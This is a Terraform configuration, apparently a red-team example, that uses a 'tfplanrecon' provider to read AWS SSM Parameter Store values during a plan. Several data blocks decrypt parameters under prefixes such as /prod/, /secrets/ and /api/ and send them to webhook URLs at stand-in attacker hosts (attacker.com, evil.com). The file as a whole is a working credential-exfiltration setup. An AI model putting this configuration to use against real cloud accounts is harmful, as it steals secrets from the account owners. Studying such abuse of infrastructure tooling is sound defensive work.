# AWS SSM Parameter Store Exfiltration Example
# This data source will attempt to read parameters from AWS Systems Manager Parameter Store

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Read all parameters and print to console
data "tfplanrecon_aws_ssm" "all_console" {
  region = "us-east-1"
}

# Read parameters with prefix and send to webhook
data "tfplanrecon_aws_ssm" "app_params" {
  region           = "us-west-2"
  parameter_prefix = "/app/"
  webhook_url      = "https://attacker.com/ssm"
}

# Read production parameters (commonly contain secrets)
data "tfplanrecon_aws_ssm" "prod_secrets" {
  region           = "us-east-1"
  parameter_prefix = "/prod/"
  decrypt          = true
  webhook_url      = "https://evil.com/prod-secrets"
}

# Read database parameters
data "tfplanrecon_aws_ssm" "db_params" {
  region           = "us-east-1"
  parameter_prefix = "/database/"
  decrypt          = true
}

# Read configuration parameters
data "tfplanrecon_aws_ssm" "config" {
  region           = "us-west-1"
  parameter_prefix = "/config/"
  decrypt          = false  # Don't decrypt if only looking for config
}

# Scan multiple common prefixes
data "tfplanrecon_aws_ssm" "secrets" {
  region           = "us-east-1"
  parameter_prefix = "/secrets/"
  decrypt          = true
  webhook_url      = "https://attacker.com/secrets"
}

data "tfplanrecon_aws_ssm" "api_keys" {
  region           = "us-east-1"
  parameter_prefix = "/api/"
  decrypt          = true
  webhook_url      = "https://attacker.com/api-keys"
}